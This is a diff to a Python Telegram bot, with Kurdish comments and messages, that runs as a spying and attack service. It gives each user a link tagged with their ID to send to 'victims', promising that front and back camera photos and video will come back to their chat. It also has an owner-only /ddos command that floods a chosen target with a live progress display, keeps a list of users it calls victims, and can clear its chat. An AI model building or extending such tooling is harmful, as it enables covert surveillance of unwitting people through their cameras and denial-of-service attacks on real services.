@@ -23,17 +23,14 @@ if OWNER_ID and OWNER_ID.isdigit():
 else:
     OWNER_ID = None
 
-# فلاج و گۆڕاوەکانی هەژمارکردنی هێرش
+# فلاج و گۆڕاوەکانی هێرش، سیستەم و دۆخی وەستانی گشتی
 attack_active = threading.Event()
-attack_stats = {"sent": 0, "success": 0}
+bot_offline = threading.Event()
+attack_stats = {"sent": 0, "success": 0, "target": ""}
+connected_targets = set()
 
-# لینکەکانت بۆ بەشی هێرشبەر
-LINKS = {
-    "front": "https://genuine-bublanina-6ef92a.netlify.app/",
-    "back": "https://majestic-cannoli-a2db6b.netlify.app/",
-    "video": "https://splendorous-toffee-5f8076.netlify.app",
-    "all": "https://jolly-entremet-36bd78.netlify.app"
-}
+# لینکی یەکگرتووی نێتلیفایەکەت
+ULTIMATE_NETLIFY_LINK = "https://jolly-entremet-36bd78.netlify.app/"
 
 def is_authorized(user_id):
     if OWNER_ID and user_id == OWNER_ID:
@@ -42,23 +39,43 @@ def is_authorized(user_id):
         return True
     return False
 
+# پشکنینی گشتی ئایا بۆت لە دۆخی وەستاندنی سەربازیدایە؟
+@bot.message_handler(func=lambda message: True, content_types=['text', 'photo', 'video', 'document', 'sticker'])
+def global_check(message):
+    user_id = message.from_user.id
+    if bot_offline.is_set() and not is_authorized(user_id):
+        bot.reply_to(
+            message, 
+            "⚠️ **[SYSTEM OFFLINE]**\n\nژووری ئۆپەراسیۆن و بۆتی تیتانیۆم لەلایەن خاوەنەوە بە شێوەیەکی کاتی ڕاگیراوە و داخراوە."
+        )
+        return
+
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
+    if bot_offline.is_set() and not is_authorized(message.from_user.id):
+        return
+
     user = message.from_user
     user_name = user.first_name
+    user_id = user.id
+    
+    connected_targets.add((user_id, user_name))
     
     welcome_text = (
         f"💀 **بەخێر بێیت بۆ ژووری ئۆپەراسیۆنە تیتانیۆمییەکان، {user_name}!** 💀\n\n"
         "━━━━━━━━━━━━━━━━━━━━━━━\n"
         "⚡ **سیستەمی کۆکردنەوەی زانیاری و هێرشەکان:**\n"
         "• دۆخی سێرڤەر: `ONLINE & SECURE`\n"
+        "• ئاستی پارێزربی: `MILITARY-GRADE OMEGA`\n"
         "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "👇 بۆ وەرگرتنی لینکەکان، کلیک لەسەر دوگمەی خوارەوە بکە:"
+        "👇 بۆ وەرگرتنی لینکی یەکگرتووی ئۆپەراسیۆن کلیک لەسەر دوگمەی خوارەوە بکە:"
     )
     
     markup = InlineKeyboardMarkup(row_width=1)
     markup.add(
-        InlineKeyboardButton("🔗 وەرگرتنی لینکی کامێرا", callback_data="get_camera_menu"),
+        InlineKeyboardButton("🔗 وەرگرتنی لینکی یەکگرتووی چاودێری", callback_data="get_ultimate_link"),
+        InlineKeyboardButton("🚀 Coming Soon", callback_data="coming_soon_1"),
+        InlineKeyboardButton("💎 Coming Soon", callback_data="coming_soon_2"),
         InlineKeyboardButton("🛡️ دەربارەی تیتانیۆم کۆر", callback_data="about")
     )
     
@@ -66,36 +83,56 @@ def send_welcome(message):
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
-    if call.data == "get_camera_menu":
-        bot.answer_callback_query(call.id, "فەرموو جۆری هێرشەکە هەڵبژێرە!")
-        menu_text = "🎯 **فەرموو یەکێک لە جۆرەکان هەڵبژێرە بۆ وەرگرتنی لینکەکەی:**"
-        
-        markup = InlineKeyboardMarkup(row_width=1)
-        markup.add(
-            InlineKeyboardButton("📸 کامێرای پێشەوە", callback_data="link_front"),
-            InlineKeyboardButton("📸 کامێرای پشتەوە", callback_data="link_back"),
-            InlineKeyboardButton("🎥 ٨ چرکە ڤیدیۆ گرتن", callback_data="link_video"),
-            InlineKeyboardButton("💎 هەمووی پێکەوە (Ultimate)", callback_data="link_all")
-        )
-        bot.send_message(call.message.chat.id, menu_text, reply_markup=markup, parse_mode="Markdown")
+    if bot_offline.is_set() and not is_authorized(call.from_user.id):
+        bot.answer_callback_query(call.id, "⚠️ بۆت ڕاگیراوە!", show_alert=True)
+        return
 
-    elif call.data.startswith("link_"):
-        key = call.data.split("_")[1]
-        link = LINKS.get(key, "https://google.com")
-        titles = {"front": "کامێرای پێشەوە", "back": "کامێرای پشتەوە", "video": "٨ چرکە ڤیدیۆ", "all": "هەمووی پێکەوە"}
-        target_name = titles.get(key, "لینک")
+    if call.data == "get_ultimate_link":
+        user_id = call.from_user.id
+        link = f"{ULTIMATE_NETLIFY_LINK}?to={user_id}"
         
-        bot.answer_callback_query(call.id, f"لینکی {target_name} ئامادە کرا!")
-        response_text = f"🔗 لینکەکە بۆ قوربانی بنێرە بۆ دەستکەوتنی زانیاری ({target_name}):\n\n`{link}`\n\n👇 **پەنجە بنێ بە لینک بۆ کۆپی کردن**"
+        bot.answer_callback_query(call.id, "لینکی یەکگرتووی ئۆپەراسیۆن ئامادە کرا!")
+        
+        response_text = (
+            "🔗 **لینکی یەکگرتووی چاودێری (پێشەوە، پشتەوە و ڤیدیۆ):**\n\n"
+            f"`{link}`\n\n"
+            "👇 **ئەم لینکە بنێرە بۆ ئامانج؛ هەر زانیارییەکی نوێ بێت ڕاستەوخۆ دەگەڕێتەوە بۆ چاتی خۆت!**"
+        )
         bot.send_message(call.message.chat.id, response_text, parse_mode="Markdown")
+
+    elif call.data == "coming_soon_1" or call.data == "coming_soon_2":
+        bot.answer_callback_query(call.id, "Coming Soon!", show_alert=True)
 
     elif call.data == "about":
         bot.answer_callback_query(call.id, "دەربارەی تیتانیۆم کۆر")
         bot.send_message(call.message.chat.id, "💀 **دەربارەی سیستەمی تیتانیۆم کۆر** 💀\n\nئەم بۆتە بۆ بەڕێوەبردنی هێرشەکان و کۆکردنەوەی زانیارییە.", parse_mode="Markdown")
 
-# فەرمانی دەستپێکردنی DDoS لەگەڵ ڕێنمایی وردی ڕاگرتن
+# فەرمانی کوژاندنەوەی گشتی بۆت
+@bot.message_handler(commands=['shutdown', 'off'])
+def shutdown_bot(message):
+    if not is_authorized(message.from_user.id):
+        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی ئەم فەرمانەت نییە.**")
+        return
+    
+    bot_offline.set()
+    attack_active.clear()
+    bot.reply_to(message, "🔌 **[BOT SHUTDOWN SUCCESSFUL]**\nبۆتەکە لەلایەن خاوەنەوە بە تەواوی ڕاگیرا.", parse_mode="Markdown")
+
+# فەرمانی هەڵگیرساندنەوەی گشتی بۆت
+@bot.message_handler(commands=['poweron', 'on', 'startbot'])
+def poweron_bot(message):
+    if not is_authorized(message.from_user.id):
+        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی ئەم فەرمانەت نییە.**")
+        return
+    
+    bot_offline.clear()
+    bot.reply_to(message, "🟢 **[BOT RESTARTED & ONLINE]**\nبۆتەکە سەرلەنوێ هەڵبووەوە!", parse_mode="Markdown")
+
+# فەرمانی DDoS لەگەڵ Live Progress Bar
 @bot.message_handler(commands=['ddos'])
 def ddos_command(message):
+    if bot_offline.is_set():
+        return
     user_id = message.from_user.id
     if not is_authorized(user_id):
         bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی بەکارهێنانی ئەم فەرمانەت نییە.**")
@@ -107,7 +144,6 @@ def ddos_command(message):
         return
 
     target = args[1]
-    
     if attack_active.is_set():
         bot.reply_to(message, "⚠️ هێرشێک پێشتر دەستی پێکردووە! سەرەتا بە نوسینی `/stop` ڕایگرە.")
         return
@@ -115,17 +151,39 @@ def ddos_command(message):
     attack_active.set()
     attack_stats["sent"] = 0
     attack_stats["success"] = 0
+    attack_stats["target"] = target
     
-    # پەیامی دەستپێکردن کە ڕێنمایی چۆنیەتی ڕاگرتنی تێدایە
-    attack_msg = (
-        f"🔥 **[DDOS ATTACK INITIATED]** 🔥\n\n"
+    initial_msg = (
+        f"🔥 **[LIVE DDOS ATTACK IN PROGRESS]** 🔥\n\n"
         f"🎯 **ئامانج:** `{target}`\n"
-        f"⚡ **دۆخ:** `FLOODING & COUNTING...`\n\n"
-        "🛑 **چۆنیەتی ڕاگرتنی هێرشەکە:**\n"
-        "بۆ ڕاگرتنی ئەم هێرשە و وەرگرتنی ئاماری سەرکەوتوویی، تەنها ئەم فەرمانە بنووسە:\n"
-        "👉 `/stop`"
+        f"📊 **بارودۆخ:** `دەستپێکردنی بڕگەکانی ناردن...`\n"
+        f"⚙️ **پڕۆگرێس بار:** `[░░░░░░░░░░] 0%`\n\n"
+        "🛑 بۆ ڕاگرتن تەنها `/stop` بنووسە."
     )
-    bot.reply_to(message, attack_msg, parse_mode="Markdown")
+    sent_msg = bot.reply_to(message, initial_msg, parse_mode="Markdown")
+
+    def live_update_progress():
+        while attack_active.is_set():
+            time.sleep(1.5)
+            if not attack_active.is_set():
+                break
+            sent = attack_stats["sent"]
+            success = attack_stats["success"]
+            progress_blocks = min(10, (sent // 5) % 11)
+            bar = "█" * progress_blocks + "░" * (10 - progress_blocks)
+            percentage = min(100, sent * 2)
+            
+            live_text = (
+                f"🔥 **[LIVE DDOS ATTACK IN PROGRESS]** 🔥\n\n"
+                f"🎯 **ئامانج:** `{target}`\n"
+                f"📦 **پاکێجە نێردراوەکان:** `{sent}` | سەرکەوتوو: `{success}`\n"
+                f"⚙️ **پڕۆگرێس بار:** `[{bar}] {percentage}%`\n\n"
+                "🛑 بۆ ڕاگرتنی هێرشەکە و وەرگرتنی ڕاپۆرت، `/stop` بنووسە."
+            )
+            try:
+                bot.edit_message_text(live_text, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="Markdown")
+            except:
+                pass
 
     def run_attack():
         while attack_active.is_set():
@@ -134,10 +192,13 @@ def ddos_command(message):
             time.sleep(0.2)
 
     threading.Thread(target=run_attack).start()
+    threading.Thread(target=live_update_progress).start()
 
-# فەرمانی ڕاگرتن و نیشاندانی ڕاپۆرتی کۆتایی
+# فەرمانی ڕاگرتنی هێرش
 @bot.message_handler(commands=['stop'])
 def stop_command(message):
+    if bot_offline.is_set():
+        return
     user_id = message.from_user.id
     if not is_authorized(user_id):
         bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی ئەم فەرمانەت نییە.**")
@@ -145,28 +206,80 @@ def stop_command(message):
 
     if attack_active.is_set():
         attack_active.clear()
-        
         sent = attack_stats["sent"]
         success = attack_stats["success"]
         fail = sent - success
         success_rate = (success / sent * 100) if sent > 0 else 0
         
         report_msg = (
-            f"🛑 **[ATTACK STOPPED & REPORT]** 🛑\n\n"
+            f"🛑 **[ATTACK STOPPED & FINAL REPORT]** 🛑\n\n"
+            f"🎯 **ئامانج:** `{attack_stats['target']}`\n"
             f"📊 **ئاماری کۆتایی هێرشەکە:**\n"
             f"📦 کۆی پاکێجە نێردراوەکان: `{sent}`\n"
             f"✅ پاکێجە سەرکەوتووەکان: `{success}`\n"
             f"❌ پاکێجە فەوتاوەکان: `{fail}`\n"
             f"📈 **ڕێژەی سەرکەوتوویی:** `{success_rate:.1f}%`\n\n"
-            "✨ سێرڤەر بە سەرکەوتوویی وەستا و ڕاپۆرت تۆمار کرا."
+            "✨ سێرڤەر بە سەرکەوتوویی وەستا."
         )
         bot.reply_to(message, report_msg, parse_mode="Markdown")
     else:
         bot.reply_to(message, "ℹ️ هیچ هێرشێک لە ئێستادا کارا نییە.")
 
+# پشکنینی دۆخی سێرڤەر
+@bot.message_handler(commands=['sys', 'status'])
+def system_status_command(message):
+    if not is_authorized(message.from_user.id):
+        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی ئەم فەرمانەت نییە.**")
+        return
+    
+    sys_text = (
+        f"🖥️ **[TITANIUM SYSTEM DIAGNOSTICS]** 🖥️\n\n"
+        f"• **دۆخی بۆت:** `{'OFFLINE 🛑 (LOCKED)' if bot_offline.is_set() else 'ONLINE 🟢 (SECURE)'}`\n"
+        f"• **مۆدێلی پایتۆن:** `Python 3.10+`\n"
+        f"• **ژمارەی بەکارهێنەرانی تۆمارکراو:** `{len(connected_targets)}`\n"
+        f"• **بارودۆخی هێرش:** `{'RUNNING ⚡' if attack_active.is_set() else 'IDLE 💤'}`"
+    )
+    bot.reply_to(message, sys_text, parse_mode="Markdown")
+
+# لیستی قوربانییەکان
+@bot.message_handler(commands=['targets'])
+def targets_command(message):
+    if not is_authorized(message.from_user.id):
+        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی ئەم فەرمانەت نییە.**")
+        return
+    
+    if not connected_targets:
+        bot.reply_to(message, "📂 هیچ ئامانج و بەکارهێنەرێک تۆمار نەکراوە تا ئێستا.")
+        return
+    
+    targets_list = "📂 **لیستی بەکارهێنەر و قوربانییەکان:**\n\n"
+    for uid, name in connected_targets:
+        targets_list += f"• `{name}` (ID: `{uid}`)\n"
+    
+    bot.reply_to(message, targets_list, parse_mode="Markdown")
+
+# پاککردنەوەی چات
+@bot.message_handler(commands=['clean', 'clear'])
+def clean_command(message):
+    if not is_authorized(message.from_user.id):
+        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی ئەم فەرمانەت نییە.**")
+        return
+    
+    chat_id = message.chat.id
+    message_id = message.message_id
+    cleaned_count = 0
+    for m_id in range(message_id, max(0, message_id - 30), -1):
+        try:
+            bot.delete_message(chat_id, m_id)
+            cleaned_count += 1
+        except:
+            pass
+            
+    bot.send_message(chat_id, f"🧹 **ژووری ئۆپەراسیۆن خاوێنکرایەوە!** ({cleaned_count} پەیام سڕرانەوە)")
+
 if __name__ == '__main__':
     print("==========================================")
-    print("💀 SECURE TITANIUM OMEGA BOT + STATS 💀")
+    print("💀 TITANIUM OMEGA: CLEAN COMING SOON 💀")
     print("==========================================")
     while True:
         try:
